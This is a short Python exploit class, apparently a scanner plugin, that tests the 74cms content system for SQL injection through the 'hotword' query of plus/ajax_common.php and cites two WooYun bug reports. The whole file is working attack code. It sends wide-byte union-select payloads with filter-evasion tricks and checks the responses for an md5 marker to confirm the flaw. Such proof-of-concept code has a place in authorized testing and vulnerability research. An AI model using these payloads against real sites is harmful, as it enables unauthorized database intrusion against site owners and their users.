# refer :http://www.wooyun.org/bugs/wooyun-2014-070316
# refer :http://www.wooyun.org/bugs/wooyun-2014-063225
# 74cms plus/ajax_common.php?act=[SQL注入]
import requests
import re


class Exploit:

    def attack(self, url):
        url1 = url + '/plus/ajax_common.php?act=hotword&query=%E9%8C%A6%27union+/*!50000SeLect*/+1,md5%281%29,3%23'
        url2 = url + '/plus/ajax_common.php?act=hotword&query=%E9%8C%A6%27%20a<>nd%201=2%20un<>ion%20sel<>ect%201,md5(1),3%23'
        r1 = requests.get(url1)
        r2 = requests.get(url2)
        if r1.status_code == 200 or r2.status_code == 200:
            if "c4ca4238a0b923820dcc509a6f75849b" in r1.text or "c4ca4238a0b923820dcc509a6f75849b" in r2.text:
                return url1 + ' has SQL Injection...'
